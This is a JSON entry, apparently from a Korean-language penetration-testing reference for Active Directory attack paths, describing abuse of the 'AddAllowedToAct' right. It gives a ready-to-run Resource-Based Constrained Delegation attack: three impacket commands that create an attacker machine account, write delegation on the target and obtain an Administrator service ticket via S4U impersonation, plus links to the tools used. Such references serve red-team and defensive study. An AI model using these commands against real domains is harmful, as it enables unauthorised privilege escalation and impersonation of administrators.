    "AddAllowedToAct": {
      "ko": "대상 컴퓨터의 RBCD 설정 쓰기 (Resource-Based Constrained Delegation)",
      "priority": "high",
      "summary": "공격자 통제 컴퓨터계정을 RBCD 로 지정 -> S4U2self/proxy 로 대상에서 임의 사용자 임퍼소네이션.",
      "abuse": [
        {
          "when": "대상이 컴퓨터",
          "steps": ["컴퓨터계정 생성(MachineAccountQuota)", "RBCD 설정", "getST 로 Administrator 티켓 발급"],
          "cmd": [
            "impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'MachinePass1!' 'corp.local/attacker:Passw0rd!'",
            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass1!'"
          ]
        }
      ],
      "tools": [
        {"name": "impacket addcomputer/rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"},
        {"name": "PowerMad + Rubeus", "type": "ps1", "url": "https://github.com/Kevin-Robertson/Powermad"}
      ]
    },

